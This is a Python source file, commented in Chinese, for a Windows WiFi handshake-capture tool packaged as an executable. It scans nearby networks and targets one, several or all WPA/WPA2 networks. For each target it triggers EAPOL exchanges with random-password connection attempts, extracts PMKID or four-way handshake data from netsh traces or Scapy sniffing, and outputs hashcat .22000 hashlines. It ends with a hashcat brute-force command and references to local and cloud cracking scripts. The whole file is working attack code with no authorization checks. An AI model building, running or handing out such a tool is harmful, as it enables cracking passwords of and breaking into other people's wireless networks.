#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WiFi握手包捕获工具 - Windows交互式独立版
功能：扫描WiFi → 选择目标 → 捕获PMKID/握手包 → 输出.22000 hashline
支持：netsh扫描 + netsh trace ETW捕获 + Scapy+Npcap捕获
打包：pyinstaller --onefile capture.py → capture.exe
"""

import subprocess
import time
import os
import sys
import struct
import tempfile
import threading
import random
import string
from dataclasses import dataclass
from typing import List, Optional, Tuple

# ============================================================================
# 脚本所在目录为工作目录
# ============================================================================
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
CAPTURE_DIR = os.path.join(SCRIPT_DIR, "captures")
os.makedirs(CAPTURE_DIR, exist_ok=True)

# ============================================================================
# 数据结构
# ============================================================================
@dataclass
class WiFiNetwork:
    """WiFi网络信息"""
    ssid: str
    bssid: str = ""
    signal: int = 0
    security: str = ""
    channel: int = 0
    band: str = ""

@dataclass
class CaptureResult:
    """捕获结果"""
    success: bool = False
    hashline: str = ""
    hash_file: str = ""
    method: str = ""
    error: str = ""

# ============================================================================
# WiFi扫描（纯netsh，不依赖第三方库）
# 修复：编码用系统默认(GBK) / signal缺失不丢弃 / 兼容中英文+隐藏SSID
# ============================================================================
def _run_netsh(args: list) -> str:
    """运行netsh命令，自动处理编码（GBK优先，UTF-8兜底）"""
    try:
        # Windows中文系统netsh输出是GBK/CP936，不是UTF-8
        r = subprocess.run(
            ['netsh'] + args,
            capture_output=True, timeout=15
        )
        # 先尝试GBK解码（中文Windows默认）
        for enc in ['gbk', 'cp936', 'utf-8', 'latin-1']:
            try:
                return r.stdout.decode(enc)
            except (UnicodeDecodeError, AttributeError):
                continue
        return r.stdout.decode('utf-8', errors='replace')
    except Exception:
        return ''

def scan_wifi() -> List[WiFiNetwork]:
    """用netsh扫描附近WiFi网络（兼容中英文系统+各种驱动差异）"""
    import re as _re
    try:
        print("    扫描WiFi网络...")

        # MAC地址正则（匹配 aa:bb:cc:dd:ee:ff 或 aa-bb-cc-dd-ee-ff）
        mac_re = _re.compile(r'[0-9a-fA-F]{2}[:\-][0-9a-fA-F]{2}[:\-][0-9a-fA-F]{2}[:\-][0-9a-fA-F]{2}[:\-][0-9a-fA-F]{2}[:\-][0-9a-fA-F]{2}')

        output = ''
        for attempt in range(3):
            output = _run_netsh(['wlan', 'show', 'networks', 'mode=bssid'])
            if not output:
                print(f"    netsh无输出，等待{3*(attempt+1)}秒重试({attempt+1}/3)...")
                time.sleep(3 * (attempt + 1))
                continue
            # 检查是否有有效内容（BSSID行包含MAC地址）
            if mac_re.search(output):
                break
            if attempt < 2:
                print(f"    未扫描到网络，等待{3*(attempt+1)}秒重试({attempt+1}/3)...")
                time.sleep(3 * (attempt + 1))

        if not output:
            print("    [!] netsh无输出（网卡可能被禁用）")
            return []

        # ── 解析netsh输出 ──
        # 关键字兼容：中文/英文/繁体
        networks = []
        current_ssid = ''
        current = {}

        for line in output.split('\n'):
            line = line.strip()
            if not line:
                continue

            # 提取冒号后的值（兼容全角冒号）
            val = ''
            if ':' in line:
                val = line.split(':', 1)[1].strip()
            elif '：' in line:
                val = line.split('：', 1)[1].strip()

            line_lower = line.lower()

            # ── SSID行（新条目开始） ──
            # 匹配: "SSID 1 : xxx" / "SSID 2 : xxx" / "SSID            : xxx"
            # 不匹配: "BSSID 1 : xx:xx:xx"
            if _re.match(r'^\s*SSID\s+\d*\s*[:：]', line, _re.IGNORECASE) and 'BSSID' not in line.upper():
                current_ssid = val
                # 允许空SSID（隐藏网络）
                current = {'ssid': current_ssid if current_ssid else '<Hidden>'}

            # ── BSSID行 ──
            elif 'BSSID' in line.upper():
                m = mac_re.search(line)
                if m and 'ssid' in current:
                    current['bssid'] = m.group(0)

            # ── 安全/身份验证 ──
            elif any(kw in line for kw in ['身份验证', '驗證', 'Authentication']):
                if val:
                    current['security'] = val

            # ── 加密 ──
            elif any(kw in line for kw in ['加密', '密碼', 'Encryption', 'Cipher']):
                if val:
                    current['encryption'] = val

            # ── 信号强度 ──
            elif any(kw in line for kw in ['信号', '訊號', 'Signal']) and '%' in line:
                try:
                    current['signal'] = int(_re.search(r'(\d+)\s*%', line).group(1))
                except:
                    pass

            # ── 频道 ──
            elif any(kw in line for kw in ['频道', '頻道', 'Channel']) and 'GHz' not in line:
                try:
                    current['channel'] = int(_re.search(r'(\d+)', val).group(1))
                except:
                    pass

            # ── 波段/频率 ──
            elif any(kw in line for kw in ['波段', 'Band', '頻帶']):
                if val:
                    current['band'] = val

            # ── 收集条目：有SSID+BSSID就保存（不强制要求signal） ──
            if 'ssid' in current and 'bssid' in current:
                networks.append(WiFiNetwork(
                    ssid=current.get('ssid', ''),
                    bssid=current.get('bssid', ''),
                    signal=current.get('signal', 0),
                    security=current.get('security', current.get('encryption', '')),
                    channel=current.get('channel', 0),
                    band=current.get('band', ''),
                ))
                # 保留ssid和security给同SSID下一个BSSID
                ssid_bak = current.get('ssid', '')
                sec_bak = current.get('security', '')
                current = {'ssid': ssid_bak, 'security': sec_bak}

        # 去重（保留信号最强的，signal=0排最后）
        best = {}
        for n in networks:
            key = n.ssid or n.bssid  # 隐藏SSID用BSSID做key
            if key and (key not in best or n.signal > best[key].signal):
                best[key] = n
        result = sorted(best.values(), key=lambda x: x.signal, reverse=True)

        if not result:
            print(f"    [!] 解析到0个网络（netsh输出{len(output)}字符）")
            # 打印前几行帮助诊断
            for i, line in enumerate(output.split('\n')[:10]):
                print(f"    | {line.rstrip()}")

        return result

    except Exception as e:
        print(f"  [!] 扫描失败: {e}")
        import traceback
        traceback.print_exc()
        return []

# ============================================================================
# 获取本机WiFi MAC地址
# ============================================================================
def get_local_mac() -> str:
    """获取本机WiFi网卡MAC地址（多种方式+GBK编码兼容）"""
    import re as _re
    mac_re = _re.compile(r'[0-9a-fA-F]{2}[:\-][0-9a-fA-F]{2}[:\-][0-9a-fA-F]{2}[:\-][0-9a-fA-F]{2}[:\-][0-9a-fA-F]{2}[:\-][0-9a-fA-F]{2}')

    # 方式1: netsh wlan show interfaces（用GBK解码）
    out = _run_netsh(['wlan', 'show', 'interfaces'])
    for line in out.split('\n'):
        if any(kw in line for kw in ['物理地址', 'Physical address', 'physical address']):
            m = mac_re.search(line)
            if m:
                return m.group(0).replace(':', '').replace('-', '').lower()

    # 方式2: getmac
    try:
        r = subprocess.run(['getmac', '/v', '/fo', 'list'], capture_output=True, timeout=5)
        text = r.stdout.decode('gbk', errors='replace')
        found = False
        for line in text.split('\n'):
            if any(kw in line.lower() for kw in ['wi-fi', 'wlan', 'wireless']):
                found = True
            if found:
                m = mac_re.search(line)
                if m:
                    return m.group(0).replace(':', '').replace('-', '').lower()
    except:
        pass

    # 方式3: 手动输入
    print("    [!] 无法自动获取WiFi MAC地址")
    mac_input = input("    请输入WiFi MAC地址 (如 aa:bb:cc:dd:ee:ff): ").strip()
    if mac_input:
        return mac_input.replace(':', '').replace('-', '').lower()
    return "000000000000"

# ============================================================================
# 触发EAPOL交换（用随机密码连接目标AP）
# ============================================================================
def trigger_eapol(ssid: str, bssid: str):
    """用随机密码连接目标AP，触发EAPOL交换"""
    random_pwd = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
    xml_path = None

    try:
        ssid_hex = ssid.encode('utf-8').hex()
        ssid_esc = ssid.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
        profile_name = f"{ssid_esc}_capture"

        xml = f"""<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{profile_name}</name>
    <SSIDConfig>
        <SSID>
            <hex>{ssid_hex}</hex>
            <name>{ssid_esc}</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>manual</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{random_pwd}</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>"""

        with tempfile.NamedTemporaryFile(mode='w', suffix='.xml', delete=False,
                                        encoding='utf-8') as f:
            f.write(xml)
            xml_path = f.name

        # 添加profile并连接（不解码输出，避免编码问题）
        subprocess.run(['netsh', 'wlan', 'add', 'profile', f'filename={xml_path}'],
                      capture_output=True, timeout=5)
        subprocess.run(['netsh', 'wlan', 'connect', f'name={profile_name}'],
                      capture_output=True, timeout=5)

        # 等待EAPOL交换
        time.sleep(4)

        # 断开并清理
        subprocess.run(['netsh', 'wlan', 'disconnect'],
                      capture_output=True, timeout=5)
        time.sleep(1)
        subprocess.run(['netsh', 'wlan', 'delete', 'profile', f'name={profile_name}'],
                      capture_output=True, timeout=5)
    except Exception as e:
        print(f"    [!] 触发EAPOL错误: {e}")
    finally:
        if xml_path:
            try:
                os.unlink(xml_path)
            except:
                pass

# ============================================================================
# 方式A：netsh trace ETW 捕获（不需要第三方库）
# ============================================================================
def capture_netsh(ssid: str, bssid: str) -> CaptureResult:
    """用netsh trace捕获EAPOL/PMKID（需管理员权限）"""
    trace_file = os.path.join(CAPTURE_DIR, "wifi_trace.etl")

    print("    [1/5] 停止旧跟踪...")
    subprocess.run(['netsh', 'trace', 'stop'], capture_output=True, timeout=30)
    time.sleep(2)

    # 清理旧文件
    for f in [trace_file, trace_file.replace('.etl', '.cab')]:
        if os.path.exists(f):
            try:
                os.remove(f)
            except:
                pass

    # 启动跟踪（增加WiFi关键字过滤提高捕获率）
    print("    [2/5] 启动网络跟踪（需管理员权限）...")
    try:
        result = subprocess.run(
            ['netsh', 'trace', 'start', 'capture=yes',
             f'traceFile={trace_file}', 'maxSize=50', 'overwrite=yes',
             'report=disabled'],
            capture_output=True, timeout=20
        )
        if result.returncode != 0:
            # 用GBK解码错误信息
            err = result.stdout.decode('gbk', errors='replace') + result.stderr.decode('gbk', errors='replace')
            if any(kw in err for kw in ['需要提升', 'elevation', '拒绝访问', 'denied', 'Elevation']):
                return CaptureResult(error="需要管理员权限！请右键 → 以管理员身份运行")
            return CaptureResult(error=f"启动跟踪失败: {err[:200]}")
        print("    [OK] 网络跟踪已启动")
    except subprocess.TimeoutExpired:
        return CaptureResult(error="启动跟踪超时")

    # 多次触发EAPOL交换（提高捕获概率）
    for attempt in range(1, 4):
        print(f"    [3/5] 第{attempt}次触发EAPOL交换（连接 {ssid}）...")
        trigger_eapol(ssid, bssid)
        time.sleep(2)

    # 额外等待确保数据写入
    print("    [4/5] 等待数据写入...")
    time.sleep(3)

    # 停止跟踪
    print("    [5/5] 停止跟踪并解析...")
    subprocess.run(['netsh', 'trace', 'stop'], capture_output=True, timeout=60)
    time.sleep(2)

    if not os.path.exists(trace_file):
        return CaptureResult(error="跟踪文件未生成")

    etl_size = os.path.getsize(trace_file)
    print(f"    ETL文件: {etl_size:,} bytes")

    # 解析ETL文件
    return parse_etl(trace_file, ssid, bssid)

# ============================================================================
# 解析ETL文件提取PMKID或握手包
# ============================================================================
def parse_etl(etl_file: str, ssid: str, bssid: str) -> CaptureResult:
    """从ETL文件中提取PMKID或EAPoL握手包（宽松搜索模式）"""
    try:
        with open(etl_file, 'rb') as f:
            data = f.read()

        mac_ap = bssid.lower().replace(':', '').replace('-', '')
        mac_cl = get_local_mac()
        essid_hex = ssid.encode('utf-8').hex()
        bssid_bytes = bytes.fromhex(mac_ap) if len(mac_ap) == 12 else b''

        print(f"    解析ETL: {len(data):,} bytes, BSSID={mac_ap}, CLIENT={mac_cl}")

        # ── 尝试1: 搜索所有PMKID标记（不绑定BSSID位置） ──
        pmkid_tag = bytes([0xdd, 0x14, 0x00, 0x0f, 0xac, 0x04])
        pmkid_positions = []
        search_pos = 0
        while True:
            idx = data.find(pmkid_tag, search_pos)
            if idx == -1:
                break
            pmkid_positions.append(idx)
            search_pos = idx + 1

        print(f"    PMKID标记找到: {len(pmkid_positions)} 处")

        for idx in pmkid_positions:
            pmkid = data[idx + 6: idx + 6 + 16]
            if len(pmkid) == 16 and pmkid.hex() != '0' * 32:
                # 检查附近是否有BSSID（扩大搜索范围到前后256字节）
                nearby = data[max(0, idx - 256):idx + 256]
                has_bssid = (not bssid_bytes) or (bssid_bytes in nearby)
                if has_bssid:
                    hashline = f"WPA*01*{pmkid.hex()}*{mac_ap}*{mac_cl}*{essid_hex}***"
                    hash_file = os.path.join(CAPTURE_DIR, f"{ssid}_pmkid.22000")
                    with open(hash_file, 'w') as f:
                        f.write(hashline + '\n')
                    print(f"    [+] PMKID找到! 偏移={idx}")
                    return CaptureResult(
                        success=True, hashline=hashline,
                        hash_file=hash_file, method="PMKID (netsh trace)"
                    )

        # ── 尝试2: 搜索EAPoL帧（宽松模式，不严格绑定BSSID） ──
        eapol_marker = b'\x88\x8e'
        m1_frames = []
        m2_frames = []
        eapol_count = 0

        pos = 0
        while True:
            pos = data.find(eapol_marker, pos)
            if pos == -1:
                break
            # 宽松匹配：不强制要求BSSID在附近（ETL格式不保证位置）
            if pos + 10 < len(data):
                # EAPoL帧: 跳过0x888e(2bytes) → ver(1)+type(1)+len(2)
                eapol_type = data[pos + 3]
                if eapol_type == 0x03:  # EAPoL-Key
                    eapol_count += 1
                    key_len = (data[pos + 4] << 8) | data[pos + 5]
                    eapol_start = pos + 2
                    eapol_end = eapol_start + 4 + key_len
                    if 50 < key_len < 1000 and eapol_end <= len(data):
                        fd = data[eapol_start:eapol_end]
                        if len(fd) > 49:
                            ki = (fd[5] << 8) | fd[6]
                            has_ack = bool(ki & 0x0080)
                            has_mic = bool(ki & 0x0100)
                            if has_ack and not has_mic:
                                m1_frames.append({'anonce': fd[17:49], 'raw': fd, 'pos': pos})
                            elif has_mic and not has_ack:
                                m2_frames.append({'raw': fd, 'pos': pos})
            pos += 2

        print(f"    EAPoL-Key帧: {eapol_count} 个 (M1={len(m1_frames)}, M2={len(m2_frames)})")

        if m1_frames and m2_frames:
            m1 = m1_frames[0]
            m2 = m2_frames[0]
            anonce_hex = m1['anonce'].hex()
            mic_hex = m2['raw'][81:97].hex() if len(m2['raw']) > 96 else '0' * 32
            m2_zeroed = bytearray(m2['raw'])
            if len(m2_zeroed) > 96:
                m2_zeroed[81:97] = b'\x00' * 16
            hashline = (f"WPA*02*{mic_hex}*{mac_ap}*{mac_cl}*"
                       f"{essid_hex}*{anonce_hex}*{m2_zeroed.hex()}*00")
            hash_file = os.path.join(CAPTURE_DIR, f"{ssid}_handshake.22000")
            with open(hash_file, 'w') as f:
                f.write(hashline + '\n')
            print(f"    [+] 握手包找到! M1偏移={m1['pos']}, M2偏移={m2['pos']}")
            return CaptureResult(
                success=True, hashline=hashline,
                hash_file=hash_file, method="EAPoL握手包 (netsh trace)"
            )

        # 搜索0x888e标记总数（调试用）
        total_888e = data.count(eapol_marker)
        return CaptureResult(
            error=f"ETL中0x888e标记={total_888e}, EAPoL-Key={eapol_count}, M1={len(m1_frames)}, M2={len(m2_frames)}"
        )

    except Exception as e:
        return CaptureResult(error=f"ETL解析失败: {e}")

# ============================================================================
# 方式B：Scapy + Npcap 捕获（可选）
# ============================================================================
def capture_scapy(ssid: str, bssid: str) -> CaptureResult:
    """用Scapy+Npcap嗅探EAPOL帧"""
    try:
        from scapy.all import sniff, EAPOL, Ether, get_if_list
    except ImportError:
        return CaptureResult(error="scapy未安装 (pip install scapy)")

    # 检查Npcap
    npcap_ok = any(os.path.exists(p) for p in
                   [r'C:\Program Files\Npcap', r'C:\Program Files (x86)\Npcap'])
    if not npcap_ok:
        return CaptureResult(error="Npcap未安装 (下载: https://npcap.com)")

    # 查找WiFi接口
    ifaces = get_if_list()
    interface = None
    for iface in ifaces:
        if any(kw in iface.lower() for kw in ['wi-fi', 'wlan', 'wireless']):
            interface = iface
            break
    if not interface and ifaces:
        interface = ifaces[0]
    if not interface:
        return CaptureResult(error="未找到网络接口")

    print(f"    接口: {interface}")
    eapol_frames = []
    stop_event = threading.Event()

    def callback(pkt):
        if pkt.haslayer(EAPOL) or (pkt.haslayer(Ether) and pkt[Ether].type == 0x888e):
            eapol_frames.append(bytes(pkt))
            print(f"    捕获到EAPOL帧! (长度={len(bytes(pkt))})")

    def sniffer():
        try:
            sniff(iface=interface, prn=callback, filter="ether proto 0x888e",
                  timeout=20, store=0, stop_filter=lambda x: stop_event.is_set())
        except:
            pass

    t = threading.Thread(target=sniffer, daemon=True)
    t.start()
    time.sleep(1)

    print(f"    触发EAPOL交换...")
    trigger_eapol(ssid, bssid)
    time.sleep(10)
    stop_event.set()
    t.join(timeout=3)

    if not eapol_frames:
        return CaptureResult(error="未捕获到EAPOL帧")

    # 解析PMKID
    mac_ap = bssid.lower().replace(':', '').replace('-', '')
    mac_cl = get_local_mac()
    essid_hex = ssid.encode('utf-8').hex()

    for frame_data in eapol_frames:
        pmkid_tag = bytes([0xdd, 0x14, 0x00, 0x0f, 0xac, 0x04])
        idx = frame_data.find(pmkid_tag)
        if idx != -1:
            pmkid = frame_data[idx + 6: idx + 6 + 16]
            if len(pmkid) == 16:
                hashline = f"WPA*01*{pmkid.hex()}*{mac_ap}*{mac_cl}*{essid_hex}***"
                hash_file = os.path.join(CAPTURE_DIR, f"{ssid}_pmkid.22000")
                with open(hash_file, 'w') as f:
                    f.write(hashline + '\n')
                return CaptureResult(
                    success=True, hashline=hashline,
                    hash_file=hash_file, method="PMKID (Scapy)"
                )

    return CaptureResult(error="EAPOL帧中未找到PMKID")

# ============================================================================
# 交互式主程序
# ============================================================================
def main():
    print()
    print("  ╔══════════════════════════════════════════════════╗")
    print("  ║     WiFi握手包捕获工具 v1.0 (Windows)           ║")
    print("  ║     扫描WiFi → 选择目标 → 捕获PMKID/握手包     ║")
    print("  ║     输出.22000 hashline用于hashcat GPU破解      ║")
    print("  ╚══════════════════════════════════════════════════╝")
    print()

    # 检查管理员权限
    try:
        is_admin = subprocess.run(
            'net session', shell=True, capture_output=True, timeout=3
        ).returncode == 0
    except:
        is_admin = False

    if not is_admin:
        print("  [!] 警告: 未以管理员身份运行！")
        print("  [!] 握手包捕获需要管理员权限（netsh trace）")
        print("  [!] 请右键EXE → 以管理员身份运行")
        print()
        input("  按回车键继续（功能可能受限）...")
        print()

    while True:
        print("  ┌─────────────────────────────┐")
        print("  │  1. 扫描附近WiFi            │")
        print("  │  2. 捕获指定SSID的握手包    │")
        print("  │  3. 批量捕获所有WiFi        │")
        print("  │  4. 查看已捕获的hashline    │")
        print("  │  0. 退出                    │")
        print("  └─────────────────────────────┘")
        choice = input("\n  请选择: ").strip()

        if choice == '0' or choice.lower() == 'q':
            print("\n  再见!")
            break

        elif choice == '1':
            # 扫描WiFi
            print("\n  [*] 扫描中...")
            networks = scan_wifi()
            if not networks:
                print("  [!] 未扫描到WiFi网络")
                continue
            print(f"\n  扫描到 {len(networks)} 个WiFi网络:\n")
            print(f"  {'#':>4s}  {'SSID':<28s}  {'信号':>4s}  {'安全类型':<16s}  {'BSSID':<19s}  {'频道':>4s}")
            print(f"  {'─'*4}  {'─'*28}  {'─'*4}  {'─'*16}  {'─'*19}  {'─'*4}")
            for i, n in enumerate(networks):
                print(f"  {i+1:>4d}  {n.ssid:<28s}  {n.signal:>3d}%  {n.security:<16s}  {n.bssid:<19s}  {n.channel:>4d}")

            # 选择目标
            print()
            sel = input("  输入编号选择目标（多个用逗号分隔，all=全选，回车=返回）: ").strip()
            if not sel:
                continue

            targets = []
            if sel.lower() == 'all':
                targets = networks
            else:
                for s in sel.split(','):
                    try:
                        idx = int(s.strip()) - 1
                        if 0 <= idx < len(networks):
                            targets.append(networks[idx])
                    except:
                        pass

            if not targets:
                print("  [!] 未选择有效目标")
                continue

            # 逐个捕获
            results = []
            for i, t in enumerate(targets):
                print(f"\n  ── 目标 [{i+1}/{len(targets)}] {t.ssid} ({t.bssid}) ──")
                r = capture_one(t.ssid, t.bssid)
                results.append((t, r))

            # 汇总结果
            show_results(results)

        elif choice == '2':
            # 指定SSID捕获
            ssid = input("\n  输入目标SSID: ").strip()
            if not ssid:
                continue
            bssid = input("  输入目标BSSID（可选，回车跳过）: ").strip()
            if not bssid:
                # 尝试扫描获取BSSID
                print("  [*] 扫描获取BSSID...")
                nets = scan_wifi()
                for n in nets:
                    if n.ssid == ssid:
                        bssid = n.bssid
                        print(f"  [+] 找到BSSID: {bssid}")
                        break
                if not bssid:
                    bssid = "00:00:00:00:00:00"
                    print("  [!] 未找到BSSID，使用默认值")

            print(f"\n  ── 捕获 {ssid} ({bssid}) ──")
            r = capture_one(ssid, bssid)
            show_results([(WiFiNetwork(ssid=ssid, bssid=bssid), r)])

        elif choice == '3':
            # 批量捕获
            print("\n  [*] 扫描中...")
            networks = scan_wifi()
            if not networks:
                print("  [!] 未扫描到WiFi网络")
                continue
            # 只捕获WPA/WPA2类型的
            wpa_nets = [n for n in networks if 'WPA' in n.security.upper() or 'PSK' in n.security.upper()]
            if not wpa_nets:
                print("  [!] 未找到WPA/WPA2网络")
                continue
            print(f"  [*] 将捕获 {len(wpa_nets)} 个WPA/WPA2网络的握手包")
            results = []
            for i, t in enumerate(wpa_nets):
                print(f"\n  ── [{i+1}/{len(wpa_nets)}] {t.ssid} ({t.bssid}) ──")
                r = capture_one(t.ssid, t.bssid)
                results.append((t, r))
            show_results(results)

        elif choice == '4':
            # 查看已捕获
            show_captured_files()

        else:
            print("  [!] 无效选择")

def capture_one(ssid: str, bssid: str) -> CaptureResult:
    """捕获单个目标：先尝试netsh trace，失败则尝试Scapy"""
    # 方式A: netsh trace（纯Windows原生）
    print("    [方式A] netsh trace ETW捕获...")
    r = capture_netsh(ssid, bssid)
    if r.success:
        print(f"    [+] 捕获成功! 方式={r.method}")
        return r
    print(f"    [-] 方式A: {r.error}")

    # 方式B: Scapy + Npcap（需要第三方库）
    print("    [方式B] Scapy + Npcap捕获...")
    r = capture_scapy(ssid, bssid)
    if r.success:
        print(f"    [+] 捕获成功! 方式={r.method}")
        return r
    print(f"    [-] 方式B: {r.error}")

    return CaptureResult(error=f"两种方式均失败")

def show_results(results: list):
    """显示捕获结果汇总 + 明确显示.22000文件路径和hashline内容"""
    print()
    print("  ════════════════════════════════════════════════")
    print("  捕获结果汇总")
    print("  ════════════════════════════════════════════════")

    success_count = 0
    all_hashlines = []

    for net, r in results:
        if r.success:
            success_count += 1
            all_hashlines.append(r.hashline)
            print(f"  [+] {net.ssid}: 成功 ({r.method})")
            print(f"      .22000文件: {r.hash_file}")
        else:
            print(f"  [-] {net.ssid}: 失败 ({r.error})")

    print(f"\n  成功: {success_count}/{len(results)}")

    if all_hashlines:
        # 合并到一个文件
        merged_file = os.path.join(CAPTURE_DIR, "all_hashes.22000")
        with open(merged_file, 'w') as f:
            for h in all_hashlines:
                f.write(h + '\n')

        # 明确显示文件路径
        print()
        print("  ┌─────────────────────────────────────────┐")
        print(f"  │  .22000文件: {merged_file}")
        print("  └─────────────────────────────────────────┘")

        # 显示hashline完整内容
        print()
        print("  ── hashline内容（复制后用于hashcat破解）──")
        print()
        for h in all_hashlines:
            print(h)
        print()

        # 也读取文件验证内容已写入
        print(f"  验证文件内容:")
        with open(merged_file, 'r') as f:
            content = f.read().strip()
            print(f"  文件行数: {len(content.splitlines())}")
            print(f"  文件大小: {os.path.getsize(merged_file)} bytes")

        # 复制到剪贴板
        try:
            text = '\n'.join(all_hashlines)
            process = subprocess.Popen(['clip'], stdin=subprocess.PIPE)
            process.communicate(text.encode('utf-8'))
            print("\n  [+] hashline已复制到剪贴板!")
        except:
            pass

        print()
        print("  下一步: 将hashline粘贴到以下工具进行GPU破解:")
        print("    - Mac本地: bash crack-local.sh")
        print("    - 云服务器: bash crack.sh")
        print("    - hashcat:  hashcat -m 22000 all_hashes.22000 -a 3 '?d?d?d?d?d?d?d?d'")
    else:
        print()
        print("  [!] 未成功捕获任何握手包")
        print("  可能原因:")
        print("    - 目标AP不支持PMKID（较旧的路由器）")
        print("    - Windows网卡驱动不支持原始帧捕获")
        print("    - 未以管理员权限运行")
        print("  建议:")
        print("    - 安装Npcap(https://npcap.com)后重试")
        print("    - 使用Linux/Kali + hcxdumptool捕获")
        print("    - 在Mac上用wifi-crack-mac的--capture模式")

def show_captured_files():
    """显示已捕获的文件"""
    print(f"\n  捕获目录: {CAPTURE_DIR}")
    files = [f for f in os.listdir(CAPTURE_DIR) if f.endswith('.22000')]
    if not files:
        print("  [!] 暂无捕获文件")
        return
    print(f"  共 {len(files)} 个文件:\n")
    all_lines = []
    for f in sorted(files):
        fpath = os.path.join(CAPTURE_DIR, f)
        with open(fpath) as fp:
            lines = [l.strip() for l in fp if l.strip().startswith('WPA*')]
        print(f"  {f} ({len(lines)} 条hashline)")
        all_lines.extend(lines)

    if all_lines:
        print(f"\n  ── 所有hashline ──")
        for h in all_lines:
            print(f"  {h}")

# ============================================================================
# 入口（防闪退：全局异常捕获 + 退出前等待按键）
# ============================================================================
if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('\n\n  已中断')
    except Exception as e:
        print(f'\n  [!] 程序异常: {e}')
        import traceback
        traceback.print_exc()
    finally:
        print()
        input('  按回车键退出...')
